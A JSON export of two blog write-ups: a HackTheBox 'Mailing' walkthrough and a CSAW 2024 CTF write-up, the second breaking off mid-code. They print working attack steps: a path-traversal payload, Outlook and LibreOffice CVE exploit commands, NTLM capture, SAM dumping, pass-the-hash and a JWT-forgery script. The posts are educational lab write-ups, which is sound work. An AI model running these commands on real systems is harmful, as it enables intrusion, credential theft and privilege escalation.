[{"content":" Link: https://app.hackthebox.com/machines/Mailing Difficulty Easy Machine Windows Enumeration Nmap\nI ran Nmap with the command nmap 10.10.11.14 -vv -p- -T4. It gave me a lot of information about the open ports on the target machine. However, my focus was primarily on the HTTP port, so I conducted an aggressive scan on all the ports to gather as much detail as possible.\nPORT STATE SERVICE REASON 25/tcp open smtp syn-ack 80/tcp open http syn-ack 110/tcp open pop3 syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 143/tcp open imap syn-ack 445/tcp open microsoft-ds syn-ack 465/tcp open smtps syn-ack 587/tcp open submission syn-ack 993/tcp open imaps syn-ack 5040/tcp open unknown syn-ack 5985/tcp open wsman syn-ack 7680/tcp open pando-pub syn-ack 47001/tcp open winrm syn-ack 49664/tcp open unknown syn-ack 49665/tcp open unknown syn-ack 49666/tcp open unknown syn-ack 49667/tcp open unknown syn-ack 55959/tcp open unknown syn-ack During the aggressive scan, I used the command nmap 10.10.11.14 -vv -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,55959 -T4 -A. While Nmap was busy scanning, I focused my attention on examining the HTTP server. The detailed scan provided me with comprehensive information about the target machine\u0026rsquo;s services and configurations.\nPORT STATE SERVICE REASON VERSION 25/tcp open smtp syn-ack hMailServer smtpd | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 80/tcp open http syn-ack Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Mailing 110/tcp open pop3 syn-ack hMailServer pop3d |_pop3-capabilities: USER TOP UIDL 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 143/tcp open imap syn-ack hMailServer imapd |_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK 445/tcp open microsoft-ds? syn-ack 465/tcp open ssl/smtp syn-ack hMailServer smtpd | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- |_ssl-date: TLS randomness does not represent time | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 587/tcp open smtp syn-ack hMailServer smtpd |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- | smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 993/tcp open ssl/imap syn-ack hMailServer imapd |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2024-02-27T18:24:10 | Not valid after: 2029-10-06T18:24:10 | MD5: bd32:df3f:1d16:08b8:99d2:e39b:6467:297e | SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7 | -----BEGIN CERTIFICATE----- | MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP | MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp | ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV | BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw | HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx | ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h | aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0 | YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E | wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f | i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i | ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG | pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4 | OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY | yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx | Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g | ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R | 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut | spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k |_-----END CERTIFICATE----- |_imap-capabilities: IMAP4 NAMESPACE IMAP4rev1 IDLE completed RIGHTS=texkA0001 QUOTA CHILDREN CAPABILITY SORT ACL OK 5040/tcp open unknown syn-ack 5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 7680/tcp open pando-pub? syn-ack 47001/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc syn-ack Microsoft Windows RPC 49665/tcp open msrpc syn-ack Microsoft Windows RPC 49666/tcp open msrpc syn-ack Microsoft Windows RPC 49667/tcp open msrpc syn-ack Microsoft Windows RPC 55959/tcp filtered unknown no-response Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 29452/tcp): CLEAN (Timeout) | Check 2 (port 39838/tcp): CLEAN (Timeout) | Check 3 (port 37492/udp): CLEAN (Timeout) | Check 4 (port 25477/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2024-05-05T11:59:54 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: -4m48s After several attempts of searching for LFI (Local File Inclusion) vulnerabilities, I decided to click on an obvious download button. Surprisingly, this approach actually worked, leading me to further exploit the system.\nI stumbled upon an intriguing configuration file path while analyzing the payload: ..\\..\\..\\..\\..\\..\\..\\Program%20Files%20(x86)\\hMailServer\\Bin\\hMailServer.INI. This discovery was inspired by an old exploit I found at https://www.exploit-db.com/exploits/7012. Essentially, this exploit provided me with the file structure for locating the hMailServer, specifically the hMailServer.INI file.\n[Directories] ProgramFolder=C:\\Program Files (x86)\\hMailServer DatabaseFolder=C:\\Program Files (x86)\\hMailServer\\Database DataFolder=C:\\Program Files (x86)\\hMailServer\\Data LogFolder=C:\\Program Files (x86)\\hMailServer\\Logs TempFolder=C:\\Program Files (x86)\\hMailServer\\Temp EventFolder=C:\\Program Files (x86)\\hMailServer\\Events [GUILanguages] ValidLanguages=english,swedish [Security] AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7 [Database] Type=MSSQLCE Username= Password=0a9f8ad8bf896b501dde74f08efd7e4c PasswordEncryption=1 Port=0 Server= Database=hMailServer Internal=1 I attempted to crack the MD5 hashes using hashcat with the command hashcat.exe -m0 myhash.txt rockyou.txt. Fortunately, I successfully cracked one of the hashes, revealing the Administrator Password as homenetworkingadministrator.\nHowever, the second hash proved to be resistant to cracking. After some research on Google, I came across a tool called hMailDatabasePasswordDecrypter, available at https://github.com/GitMirar/hMailDatabasePasswordDecrypter. This tool specializes in decrypting blowfish-encrypted hMail database passwords.\n┌──(root㉿kali)-[/HTB] └─# git clone https://github.com/GitMirar/hMailDatabasePasswordDecrypter.git Cloning into \u0026#39;hMailDatabasePasswordDecrypter\u0026#39;... remote: Enumerating objects: 8, done. remote: Total 8 (delta 0), reused 0 (delta 0), pack-reused 8 Receiving objects: 100% (8/8), 9.53 KiB | 1.36 MiB/s, done. ┌──(root㉿kali)-[/HTB] └─# cd hMailDatabasePasswordDecrypter ┌──(root㉿kali)-[/HTB/hMailDatabasePasswordDecrypter] └─# ls blowfish.cpp blowfish.h blowfish.h2 main.cpp Makefile README.md ┌──(root㉿kali)-[/HTB/hMailDatabasePasswordDecrypter] └─# make g++ blowfish.cpp main.cpp -o decrypt ┌──(root㉿kali)-[/HTB/hMailDatabasePasswordDecrypter] └─# ./decrypt 0a9f8ad8bf896b501dde74f08efd7e4c 6FC6F69152AD Following the steps outlined in the GitHub README page, I attempted to crack the password successfully. However, when I tried to connect to the POP3 server using Telnet, I encountered difficulties as it wasn\u0026rsquo;t functioning as expected.\nUser Root After further enumeration regarding hMailServer, I came across an exploit that could be useful, available at https://sploitus.com/exploit?id=425B7616-AF36-5AD0-912F-A6B7A45E41E6. Following the steps outlined in the CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability GitHub repository at https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability, I proceeded to run Responder on my Kali machine using the command sudo responder -I tun0.\n(Note: If Responder doesn\u0026rsquo;t return the hashes, you can use smbserver as suggested in the proof of concept on the GitHub page. I initially encountered the same issue, but after several attempts, it worked for me.)\nAfter running Responder, I executed the following command:\n┌──(root㉿kali)-[/HTB/Mailing/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability] └─# python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient mayay email pls look hi\u0026#39; CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC. Alexander Hagenah / @xaitax / ah@primepage.de ✅ Email sent successfully. After sending the email, I monitored Responder, and to my satisfaction, I observed that it captured a user hash.\nmaya::MAILING:dac4fe0aec512cccracked the above hash with the following command:\nhashcat.exe -m 5600 myhash.txt rockyou.txt --self-test-disable Our password is: m4y4ngs4ri. I used this password with the following command to establish a shell: evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri. This successfully granted me access to the system, and I was able to retrieve the user flag.\nRoot Flag I came across LibreOffice installed in the Program Files directory, and upon further investigation, I discovered a CVE associated with its version: CVE-2023-2255 (https://github.com/elweth-sec/CVE-2023-2255).\nTo exploit this vulnerability, I executed the following Python code:\npython3 CVE-2023-2255.py --cmd \u0026#39;net localgroup Administrators maya /add\u0026#39; --output \u0026#39;exploit.odt\u0026#39; This generated an exploit file named exploit.odt.\nNext, I launched an Impacket SMB server using the command:\nimpacket-smbserver mailing `pwd` -smb2support Then, within the Evil-WinRM shell, I executed the following commands:\nnet use \\\\10.10.14.98\\mailing copy \\\\10.10.14.98\\mailing\\exploit.odt These commands allowed me to access the exploit file from the SMB server.\nAfter copying the exploit.odt file from the SMB server, I waited for a few moments. Then, to confirm that the user maya had elevated privileges to administrator, I executed the command net user maya.\nWith confirmation of elevated privileges, I proceeded to dump the hashes using the crackmapexec command:\ncrackmapexec smb 10.10.11.14 -u maya -p \u0026#34;m4y4ngs4ri\u0026#34; --sam This command allowed me to retrieve the SAM (Security Account Manager) database hashes from the target system.\n┌──(kali㉿kali)-[~] └─$ crackmapexec smb 10.10.11.14 -u maya -p \u0026#34;m4y4ngs4ri\u0026#34; --sam [*] First time use detected [*] Creating home directory structure [*] Creating default workspace [*] Initializing FTP protocol database [*] Initializing SSH protocol database [*] Initializing SMB protocol database [*] Initializing WINRM protocol database [*] Initializing LDAP protocol database [*] Initializing RDP protocol database [*] Initializing MSSQL protocol database [*] Copying default configuration file [*] Generating SSL certificate SMB 10.10.11.14 445 MAILING [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False) SMB 10.10.11.14 445 MAILING [+] MAILING\\maya:m4y4ngs4ri (Pwn3d!) SMB 10.10.11.14 445 MAILING [+] Dumping SAM hashes SMB 10.10.11.14 445 MAILING Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.14 445 MAILING WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c::: SMB 10.10.11.14 445 MAILING localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae::: SMB 10.10.11.14 445 MAILING maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af::: SMB 10.10.11.14 445 MAILING [+] Added 6 SAM hashes to the database Now, to gain root access to the box without cracking the hash, I can log in using the hash we previously dumped.\nI\u0026rsquo;ll use the following command with impacket-wmiexec:\nimpacket-wmiexec localadmin@10.10.11.14 -hashes \u0026#34;aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae\u0026#34; This command will authenticate me as the local administrator using the hashed credentials we obtained earlier, granting us root access to the box.\nThere we go! We now have access to the local administrator account. We\u0026rsquo;ve successfully rooted this easy Windows box. Great job!\nConclusion: Thanks for reading my walkthrough. Hacking through the challenges presented by this box has been an enriching experience. Happy Hacking! 🫡\n","permalink":"http://localhost:1313/posts/hackthebox/mailing/","summary":"Link: https://app.hackthebox.com/machines/Mailing Difficulty Easy Machine Windows Enumeration Nmap\nI ran Nmap with the command nmap 10.10.11.14 -vv -p- -T4. It gave me a lot of information about the open ports on the target machine. However, my focus was primarily on the HTTP port, so I conducted an aggressive scan on all the ports to gather as much detail as possible.\nPORT STATE SERVICE REASON 25/tcp open smtp syn-ack 80/tcp open http syn-ack 110/tcp open pop3 syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 143/tcp open imap syn-ack 445/tcp open microsoft-ds syn-ack 465/tcp open smtps syn-ack 587/tcp open submission syn-ack 993/tcp open imaps syn-ack 5040/tcp open unknown syn-ack 5985/tcp open wsman syn-ack 7680/tcp open pando-pub syn-ack 47001/tcp open winrm syn-ack 49664/tcp open unknown syn-ack 49665/tcp open unknown syn-ack 49666/tcp open unknown syn-ack 49667/tcp open unknown syn-ack 55959/tcp open unknown syn-ack During the aggressive scan, I used the command nmap 10.","title":"Mailing Writeup - HackTheBox"},{"content":"Welcome to the write-up of CSAW Quals 2024. This document details the CTF challenges I solved during the competition.\nThe Triple Illusion (Forensics) We were given three .png files. I used ExifTool on one and zsteg on the other two to extract some information from the files, as shown below for all of them.\n╭─rezy@dev ~/Desktop/images ╰─➤ exiftool datavsmetadata.png ExifTool Version Number : 12.76 File Name : datavsmetadata.png User Comment : Think about a two-input gate that outputs when inputs differ. XP Comment : Now that you know what operation is needed, have you found the right key? Comment : Can you crack my secret? Here\u0026#39;s a list of numbers: See what they reveal. 0 0 0 0 0 0 0 0 15 23 23 4 7 0 22 1 23 28 0 18 10 12 0 7 23 2 17 18 21 16 0 0 0 0 0 28 7 16 17 16 6 17 11 0 1 0 21 23 4 24 0 0 0 0 0 0 ╭─rezy@dev ~/Desktop/images ╰─➤ zsteg -a hibiscus.png | grep { b1,rgb,lsb,xy .. text: \u0026#34;ekasemk{oiiik_axiu_xsu_gieiwem_moi_nmivrxks_tmklec_ypxz}\u0026#34; ╭─rezy@dev ~/Desktop/images ╰─➤ zsteg -a roses.png | grep { b1,rgb,lsb,xy .. text: \u0026#34;csawctf{heres_akey_now_decrypt_the_vigenere_cipher_text}\u0026#34; I then used the key obtained from roses.png to decode the given cipher: ekasemk{oiiik_axiu_xsu_gieiwem_moi_nmivrxks_tmklec_ypxz}. The decryption was performed using the key csawctfheresakeynowdecryptthevigenereciphertext, after removing the underscores and curly braces. This process gave us a new key: csawctf{heres_anew_key_decrypt_the_secretto_reveal_flag}.\nWith the given key, I used this code:\ndef xor_decrypt(numbers, key): key_ascii = [ord(c) for c in key] key_length = len(key_ascii) decrypted_chars = [] for i, num in enumerate(numbers): key_char = key_ascii[i % key_length] # xor decrypted_char = num ^ key_char # printable ASCII range 32 - 126 decrypted_char = (decrypted_char - 32) % (126 - 32 + 1) + 32 # conv to char decrypted_chars.append(chr(decrypted_char)) return \u0026#39;\u0026#39;.join(decrypted_chars) numbers = [0, 0, 0, 0, 0, 0, 0, 0, 15, 23, 23, 4, 7, 0, 22, 1, 23, 28, 0, 18, 10, 12, 0, 7, 23, 2, 17, 18, 21, 16, 0, 0, 0, 0, 0, 28, 7, 16, 17, 16, 6, 17, 11, 0, 1, 0, 21, 23, 4, 24, 0, 0, 0, 0, 0, 0] key = \u0026#34;csawctf{heres_anew_key_decrypt_the_secretto_reveal_flag}\u0026#34; decrypted_message = xor_decrypt(numbers, key) print(\u0026#39;flag is: \u0026#39;, decrypted_message) The code defines a function xor_decrypt that decrypts a list of numbers using a key by applying an XOR operation. It converts each character of the key to its ASCII value and uses it to decrypt the corresponding number in the list, ensuring the result falls within the printable ASCII range. Finally, the decrypted values are combined into a string and printed as the result.\nAnd we get our flag as csawctf{great_work_you_cracked_the_obscured_secret_flag}.\nLost Pyramid (Web) We were given the source code, and upon reviewing it, we found that we needed to access the /kings_lair endpoint to obtain the flag. To reach that endpoint, we required a valid JWT token. The source code also revealed that the payload of the JWT must include a valid KINGSDAY in the CURRENT_DATE setup. Below is the typical JWT for a regular user:\n{ \u0026#34;ROLE\u0026#34;: \u0026#34;commoner\u0026#34;, \u0026#34;CURRENT_DATE\u0026#34;: \u0026#34;07_09_2024_AD\u0026#34;, \u0026#34;exp\u0026#34;: 96333722311 } The role must be set to \u0026ldquo;royalty.\u0026rdquo;\nAdditionally, the source code indicates that a private key is used to generate the JWT. We can exploit a algorithm confusion attack to forge a JWT token, but we first need to identify the public key. To discover the KINGSDAY and PUBLICKEY, I found Server-Side Template Injection (SSTI) vulnerability at the /scarab_room endpoint using payloads {{ PUBLICKEY }} and {{ KINGSDAY }}. This revealed the following:\nPublic Key: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2 KINGSDAY: 03_07_1341_BC So with the information I have, I wrote a python code to forge a JWT token for me:\nimport jwt import datetime public_key = \u0026#34;\u0026#34;\u0026#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2\u0026#34;\u0026#34;\u0026#34; kingsday = \u0026#34;03_07_1341_BC\u0026#34; payload = { \u0026#34;ROLE\u0026#34;: \u0026#34;royalty\u0026#34;, \u0026#34;CURRENT_DATE\u0026#34;: kingsday, \u0026#34;exp\u0026#34;: datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365 * 3000)) } token = jwt.encode(payload, public_key, algorithm=\u0026#34;HS256\u0026#34;) print(\u0026#34;jwt token:\u0026#34;, token) Which, upon running, gives the following error:\njwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret. So, after some research, I found that forging a token like this is no longer possible with the latest version of PyJWT. Instead, you can install pyjwt==0.4.3 with pip install pyjwt==0.4.3 and run the code above. However, there is also a hackish solution that someone posted.\nThen I tried this method and adjusted my code accordingly. This is the final version I created:\nimport jwt import datetime # Prepare an override method to bypass key checks def prepare_key(key): return jwt.utils.force_bytes(key) # Override HS256\u0026#39;s prepare key method to disable the asymmetric key check jwt.api_jws._jws_global_obj._algorithms[\u0026#39;HS256\u0026#39;].prepare_key = prepare_key # Your public key (which is normally only for verification, not signing) public_key = \u0026#34;\u0026#34;\u0026#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2\u0026#34;\u0026#34;\u0026#34; # JWT payload kingsday = \u0026#34;03_07_1341_BC\u0026#34; payload = { \u0026#34;ROLE\u0026#34;: \u0026#34;royalty\u0026#34;, \u0026#34;CURRENT_DATE\u0026#34;: kingsday, \u0026#34;exp\u0026#34;: datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365 * 3000)) } # Generate a JWT using the public key, bypassing the security check token = jwt.encode(payload, key=public_key, algorithm=\u0026#39;HS256\u0026#39;) # Print the JWT token print(\u0026#34;JWT token:\u0026#34;, token) Then this gave me a JWT, which I used in Burp Suite to get our flag. AES Diffusion (Crypto) We were given a port and an IP to connect to, i.e., nc diffusion.ctf.csaw.io 5000. We also received an aes_simulator.py file with the following content:\nN_ROWS = 4 N_COLS = 4 def CyclicShift(row, shift): return row[shift:] + row[:shift] def ShiftRows(state): for row_index in range(N_ROWS): state[row_index] = CyclicShift(state[row_index], row_index) return state def BuildExpressionString(column, matrix_row): expression = \u0026#34;(\u0026#34; for (i,coefficient) in enumerate(matrix_row): term = str(coefficient) + \u0026#34;*\u0026#34; + column[i] should_insert_plus = i \u0026lt; len(matrix_row) - 1 expression += term if should_insert_plus: expression += \u0026#34; + \u0026#34; return expression + \u0026#34;)\u0026#34; def GetStateColumn(state, column_index): column = [] for row in state: column.append(row[column_index]) return column def MultiplyColumn(column): matrix = [ [2, 3, 1, 1], [1, 2, 3, 1], [1, 1, 2, 3], [3, 1, 1, 2] ] new_column = [] for row in matrix: new_element = BuildExpressionString(column, row) new_column.append(new_element) return new_column def MixColumns(state): new_columns = [] for column_index in range(N_COLS): column = GetStateColumn(state, column_index) new_column = MultiplyColumn(column) new_columns.append(new_column) return Transpose(new_columns) def Transpose(matrix): return [[matrix[j][i] for j in range(len(matrix))] for i in range(len(matrix[0]))] def PrettyPrint(matrix): for row in matrix: print(row) def PrettyPrint2(matrix): for row in matrix: for element in row: print(element) state = [[\u0026#34;x0\u0026#34;, \u0026#34;x4\u0026#34;, \u0026#34;x8\u0026#34;, \u0026#34;x12\u0026#34;], [\u0026#34;x1\u0026#34;, \u0026#34;x5\u0026#34;, \u0026#34;x9\u0026#34;, \u0026#34;x13\u0026#34;], 